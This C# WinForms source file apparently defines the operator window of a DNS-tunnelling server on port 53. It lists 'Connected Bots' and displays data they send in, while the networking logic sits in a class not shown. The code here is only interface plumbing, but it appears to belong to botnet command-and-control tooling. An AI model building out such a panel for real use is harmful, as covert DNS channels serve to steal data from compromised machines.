using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using Server.Logic;

namespace Server.UI
{
    public partial class MainForm : Form
    {
        private ServerLogic serverLogic = null!;

        public MainForm()
        {
            InitializeComponent();
            InitializeCustomComponents();
            InitializeServerLogic();
        }

        private void InitializeServerLogic()
        {
            serverLogic = new ServerLogic();
            serverLogic.OnLogMessage += LogMessage;
            serverLogic.OnClientAdded += AddClientToList;
            serverLogic.OnClientRemoved += RemoveClientFromList;
            serverLogic.OnClientCountChanged += UpdateClientCount;
        }

        private void InitializeCustomComponents()
        {
            this.Text = "DNS Tunneling Server - Port 53 Manager";
            this.Size = new Size(1000, 700);
            this.StartPosition = FormStartPosition.CenterScreen;

            // Status Panel
            Panel statusPanel = new Panel
            {
                Dock = DockStyle.Top,
                Height = 80,
                BorderStyle = BorderStyle.FixedSingle
            };

            Label lblStatus = new Label
            {
                Text = "Server Status:",
                Location = new Point(10, 10),
                AutoSize = true,
                Font = new Font("Arial", 10, FontStyle.Bold)
            };

            Label lblServerStatus = new Label
            {
                Name = "lblServerStatus",
                Text = "Stopped",
                Location = new Point(120, 10),
                AutoSize = true,
                ForeColor = Color.Red,
                Font = new Font("Arial", 10, FontStyle.Bold)
            };

            Button btnStart = new Button
            {
                Name = "btnStart",
                Text = "Start Server",
                Location = new Point(10, 40),
                Size = new Size(120, 30),
                BackColor = Color.Green,
                ForeColor = Color.White
            };
            btnStart.Click += BtnStart_Click;

            Button btnStop = new Button
            {
                Name = "btnStop",
                Text = "Stop Server",
                Location = new Point(140, 40),
                Size = new Size(120, 30),
                BackColor = Color.Red,
                ForeColor = Color.White,
                Enabled = false
            };
            btnStop.Click += BtnStop_Click;

            Button btnClearLogs = new Button
            {
                Name = "btnClearLogs",
                Text = "Clear Logs",
                Location = new Point(270, 40),
                Size = new Size(120, 30)
            };
            btnClearLogs.Click += BtnClearLogs_Click;

            Label lblConnected = new Label
            {
                Name = "lblConnected",
                Text = "Connected Clients: 0",
                Location = new Point(400, 45),
                AutoSize = true,
                Font = new Font("Arial", 9, FontStyle.Bold)
            };

            statusPanel.Controls.AddRange(new Control[] { lblStatus, lblServerStatus, btnStart, btnStop, btnClearLogs, lblConnected });
            this.Controls.Add(statusPanel);

            // Clients ListBox
            Label lblClients = new Label
            {
                Text = "Connected Bots:",
                Location = new Point(10, 90),
                AutoSize = true,
                Font = new Font("Arial", 9, FontStyle.Bold)
            };
            this.Controls.Add(lblClients);

            ListBox lstClients = new ListBox
            {
                Name = "lstClients",
                Location = new Point(10, 115),
                Size = new Size(250, 500),
                Font = new Font("Consolas", 9)
            };
            this.Controls.Add(lstClients);

            // Data Display
            Label lblData = new Label
            {
                Text = "Received Data (JSON Format):",
                Location = new Point(270, 90),
                AutoSize = true,
                Font = new Font("Arial", 9, FontStyle.Bold)
            };
            this.Controls.Add(lblData);

            RichTextBox txtData = new RichTextBox
            {
                Name = "txtData",
                Location = new Point(270, 115),
                Size = new Size(700, 500),
                Font = new Font("Consolas", 9),
                ReadOnly = true,
                BackColor = Color.Black,
                ForeColor = Color.LimeGreen
            };
            this.Controls.Add(txtData);
        }

        private void BtnStart_Click(object? sender, EventArgs e)
        {
            try
            {
                serverLogic.StartServer();

                UpdateUI(() =>
                {
                    if (this.Controls.Find("lblServerStatus", true).FirstOrDefault() is Label lblStatus)
                    {
                        lblStatus.Text = "Running on Port 53";
                        lblStatus.ForeColor = Color.Green;
                    }

                    if (this.Controls.Find("btnStart", true).FirstOrDefault() is Button btnStart)
                        btnStart.Enabled = false;

                    if (this.Controls.Find("btnStop", true).FirstOrDefault() is Button btnStop)
                        btnStop.Enabled = true;
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void BtnStop_Click(object? sender, EventArgs e)
        {
            serverLogic.StopServer();

            UpdateUI(() =>
            {
                if (this.Controls.Find("lblServerStatus", true).FirstOrDefault() is Label lblStatus)
                {
                    lblStatus.Text = "Stopped";
                    lblStatus.ForeColor = Color.Red;
                }

                if (this.Controls.Find("btnStart", true).FirstOrDefault() is Button btnStart)
                    btnStart.Enabled = true;

                if (this.Controls.Find("btnStop", true).FirstOrDefault() is Button btnStop)
                    btnStop.Enabled = false;
            });
        }

        private void BtnClearLogs_Click(object? sender, EventArgs e)
        {
            if (this.Controls.Find("txtData", true).FirstOrDefault() is RichTextBox txtData)
            {
                txtData.Clear();
            }
        }

        private void LogMessage(string message, Color color)
        {
            UpdateUI(() =>
            {
                if (this.Controls.Find("txtData", true).FirstOrDefault() is RichTextBox txtData)
                {
                    txtData.SelectionStart = txtData.TextLength;
                    txtData.SelectionLength = 0;
                    txtData.SelectionColor = color;
                    txtData.AppendText(message + "\n");
                    txtData.ScrollToCaret();
                }
            });
        }

        private void AddClientToList(string clientInfo)
        {
            UpdateUI(() =>
            {
                if (this.Controls.Find("lstClients", true).FirstOrDefault() is ListBox lstClients)
                {
                    lstClients.Items.Add(clientInfo);
                }
            });
        }

        private void RemoveClientFromList(string clientId)
        {
            UpdateUI(() =>
            {
                if (this.Controls.Find("lstClients", true).FirstOrDefault() is ListBox lstClients)
                {
                    for (int i = lstClients.Items.Count - 1; i >= 0; i--)
                    {
                        if (lstClients.Items[i].ToString()?.StartsWith(clientId) == true)
                        {
                            lstClients.Items.RemoveAt(i);
                        }
                    }
                }
            });
        }

        private void UpdateClientCount(int count)
        {
            UpdateUI(() =>
            {
                if (this.Controls.Find("lblConnected", true).FirstOrDefault() is Label lblConnected)
                {
                    lblConnected.Text = $"Connected Clients: {count}";
                }
            });
        }

        private void UpdateUI(Action action)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(action);
            }
            else
            {
                action();
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            serverLogic.StopServer();
            base.OnFormClosing(e);
        }
    }
}
